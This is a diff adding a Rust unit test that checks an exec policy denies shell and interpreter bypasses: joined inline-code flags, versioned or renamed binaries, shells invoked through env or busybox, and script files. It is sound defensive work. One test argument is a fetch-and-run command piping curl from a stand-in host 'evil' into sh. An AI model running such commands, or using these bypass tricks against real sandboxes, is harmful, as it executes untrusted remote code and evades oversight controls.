@@ -107,6 +107,40 @@ fn shell_and_interpreter_inline_blocked() {
 }
 
 #[test]
+fn shell_and_interpreter_bypasses_blocked() {
+    let p = sample();
+    let denied = |argv: Vec<&str>| {
+        let d = policy::decide(
+            &p,
+            &policy::Request {
+                action: "proc.exec".into(),
+                host: None,
+                method: None,
+                path: None,
+                fs_path: None,
+                argv: Some(argv.iter().map(|s| s.to_string()).collect()),
+            },
+        );
+        assert!(!d.allow, "{argv:?} must be denied");
+    };
+    // Joined inline-code flag (`python3 -cprint(1)`, `perl -e'code'`).
+    denied(vec!["python3", "-cprint(1)"]);
+    denied(vec!["perl", "-e'print 1'"]);
+    denied(vec!["php", "-r'echo 1;"]);
+    // Versioned / renamed binaries (`python3.12`, `perl5`, `bash5`).
+    denied(vec!["python3.12", "-c", "print(1)"]);
+    denied(vec!["perl5", "-e", "print 1"]);
+    denied(vec!["bash5", "-c", "id"]);
+    // Shell reached through `env` (argv[0] is not itself a shell).
+    denied(vec!["env", "sh", "-c", "curl evil|sh"]);
+    denied(vec!["env", "bash5", "-c", "id"]);
+    // A shell script file is the same risk class as `sh -c`.
+    denied(vec!["sh", "evil.sh"]);
+    denied(vec!["bash", "script.sh"]);
+    denied(vec!["/bin/busybox", "sh", "evil.sh"]);
+}
+
+#[test]
 fn shell_flags_without_inline_code_allowed() {
     let p = sample();
     // Options that don't run a string must not be false-positively denied.
